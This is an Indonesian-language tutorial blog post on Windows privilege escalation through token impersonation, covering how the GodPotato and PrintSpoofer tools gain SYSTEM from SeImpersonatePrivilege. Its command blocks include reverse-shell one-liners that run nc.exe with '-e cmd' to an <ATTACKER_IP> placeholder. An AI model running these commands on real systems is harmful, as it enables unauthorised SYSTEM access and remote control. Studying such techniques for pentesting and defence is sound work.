---
title: "[Windows PrivEsc] Token Impersonation (SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege)"
author: "novran"
date: 2024-11-20 00:00:00 +0700
categories: [Windows Privilege Escalation]
tags: [Windows Privilege Escalation]
image:
  path: /images/2024-11-20-windows-privilege-escalation-seimpersonateprivilege-token-impersonation-banner.png
---

Impersonate adalah hak istimewa di Windows yang memungkinkan kita untuk menyamar sebagai User lain (termasuk menyamar sebagai `NT AUTHORITY\SYSTEM`) untuk menjalankan sebuah tugas atau proses di bawah naungan User tersebut.

> **Why?**
> 
> Kita ambil contoh Service IIS (Web Server).

Ketika User yang menjalankan service IIS bukanlah `NT AUTHORITY\SYSTEM`, maka proses yang dijalankan oleh Service tersebut mungkin tidak memiliki Privilege yang cukup untuk mengakses semua sumber daya (Resource) yang dibutuhkan oleh IIS untuk mengoperasikan Web Server secara keseluruhan.

Namun **dengan menggunakan Impersonation, layanan IIS masih dapat menjalankan tugas tertentu yang memerlukan hak istimewa tanpa harus (User IIS-nya) di-setting menggunakan Role khusus**. Jadi, dengan ini, layanan IIS **masih dapat melanjutkan tugasnya tanpa harus terhenti hanya karena user IIS tidak memiliki Role yang setara** dengan `NT AUTHORITY\SYSTEM`.

# Abuse Token Impersonation

Namun dengan adanya fitur Impersonation ini, Kita dapat memanfaatkannya untuk meningkatkan hak akses dari user (yang memiliki atribut `SeImpersonatePrivilege` atau `SeAssignPrimaryTokenPrivilege`) menjadi `NT AUTHORITY\SYSTEM`.

| Privilege                       | Windows API Function         | Tujuan                                                              |
|---------------------------------|------------------------------|---------------------------------------------------------------------|
| `SeImpersonatePrivilege`        | [**CreateProcessWithTokenW**](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)  | Meniru token untuk menjalankan proses dengan hak istimewa tertentu. |
| `SeAssignPrimaryTokenPrivilege` | [**CreateProcessAsUserA**](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) | Mengganti token utama untuk membuat proses dengan identitas baru.   |

# Exploit

## GodPotato (Windows 2012-2022)

> **Affected:** Windows Server 2012 - Windows Server 2022, Windows 8, Windows 10, & Windows 11 (Until 2022)
>
> [GodPotato.exe](https://github.com/BeichenDream/GodPotato/releases/latest) by **BeichenDream** [2023]

Exploit:
```powershell
# Run Command
.\GodPotato -cmd "cmd /c whoami"

# Reverse Shell
GodPotato -cmd "C:\Windows\temp\nc.exe -t -e C:\Windows\System32\cmd.exe <ATTACKER_IP> 443"
```

**Method**

Pada `DCOM`, ditemukan kelemahan pada cara `rpcss` menangani `oxid`. Karena `rpcss` adalah layanan SYSTEM yang selalu aktif, metode ini dapat dijalankan hampir di semua versi Windows Tahun 2012-2022.

GodPotato menggunakan metode ini untuk meningkatkan hak akses (Privilege Escalation) di Windows (2012-2022) dengan memanfaatkan kelemahan pada `DCOM` dan layanan `rpcss`. Jika seorang pengguna memiliki izin **SeImpersonatePrivilege**, mereka dapat meningkatkan hak akses menjadi `NT AUTHORITY\SYSTEM`.

## PrintSpoofer (Windows ~2019)

> **Affected:** Windows 10, Windows Server 2019  (Until 2019)
> 
> [PrintSpoofer.exe](https://github.com/itm4n/PrintSpoofer/releases/latest) by **itm4n** [2020]

Exploit:
```powershell
# Interactive Shell
.\PrintSpoofer.exe -i -c cmd

# Reverse Shell
.\PrintSpoofer.exe -c "C:\Windows\temp\nc.exe <ATTACKER_IP> 443 -e cmd"
```

**Method**

PrintSpoofer memanfaatkan Named Pipe untuk melakukan impersonasi menggunakan fungsi ImpersonateNamedPipeClient().
1. Membuat Named Pipe dengan `CreateNamedPipe()` dan memberikan akses ke semua orang.
2. Menggunakan `ConnectNamedPipe()` untuk menunggu koneksi klien.
3. Setelah koneksi diterima, `ImpersonateNamedPipeClient()` digunakan untuk mendapatkan hak akses klien dan menjalankan kode sebagai pengguna tersebut.

Untuk memaksa `SYSTEM`, PrintSpoofer menggunakan eksploitasi **PrinterBug** yang memanfaatkan fungsi `RpcRemoteFindFirstPrinterChangeNotificationEx()`. Ini digunakan oleh Print Service untuk mengirim notifikasi perubahan melalui RPC (Remote Procedure Call) menggunakan Named Pipe.

> Namun, **spoolss Named Pipe bawaan yang digunakan oleh Print Service itu sudah dimiliki oleh SYSTEM** dan tidak bisa digantikan.

**Bypass**

Bypass yang digunakan yaitu dengan menambahkan karakter "/" ke dalam nama host, lalu sistem akan menganggap itu valid, sehingga validasi dapat di-bypass. Seperti `\\HOSTNAME/pipe/foo123` akan diubah menjadi `\\HOSTNAME\pipe\foo123\pipe\spoolss` secara otomatis oleh sistem. Yang artinya, kita bisa membuat Named Pipe yang terlihat seperti milik SYSTEM, sehingga SYSTEM tanpa sadar akan terhubung ke Named Pipe yang kita buat. Hasilnya, fungsi Printer akan terhubung ke Named Pipe yang sudah kita kontrol dan token SYSTEM akan kita terima.
